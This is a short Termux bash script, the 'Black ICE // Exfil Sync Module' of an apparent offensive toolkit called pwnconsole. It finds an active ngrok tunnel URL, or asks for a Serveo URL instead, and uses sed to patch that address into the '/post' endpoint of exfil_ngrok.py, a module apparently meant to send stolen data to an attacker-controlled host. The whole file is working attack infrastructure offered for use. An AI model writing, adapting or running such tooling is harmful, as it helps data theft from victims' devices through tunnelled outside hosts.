#!/data/data/com.termux/files/usr/bin/bash

echo "[*] Running Black ICE // Exfil Sync Module"

MOD="$HOME/pwnconsole/modules"
TARGET_FILE="$MOD/exfil_ngrok.py"

# --- Attempt to grab Ngrok tunnel
NGROK_URL=$(curl -s http://127.0.0.1:4040/api/tunnels | grep -o 'https://[a-z0-9]*\.ngrok.io' | head -n1)

# --- If Ngrok fails, ask for Serveo backup
if [ -z "$NGROK_URL" ]; then
    echo "[!] Ngrok tunnel not found."
    read -p "[+] Enter active Serveo URL (e.g. https://xyz.serveo.net): " SERVEO_URL
    EXFIL_URL="$SERVEO_URL"
else
    echo "[+] Ngrok tunnel detected: $NGROK_URL"
    EXFIL_URL="$NGROK_URL"
fi

# --- Inject into exfil_ngrok.py
if [ -f "$TARGET_FILE" ]; then
    sed -i 's|https://.*\.ngrok\.io/post|'"$EXFIL_URL"'/post|g' "$TARGET_FILE"
    sed -i 's|https://.*\.serveo\.net/post|'"$EXFIL_URL"'/post|g' "$TARGET_FILE"
    echo "[+] Patched exfil_ngrok.py with: $EXFIL_URL/post"
else
    echo "[-] exfil_ngrok.py not found in $MOD"
fi

echo "[*] Exfil Sync Complete."
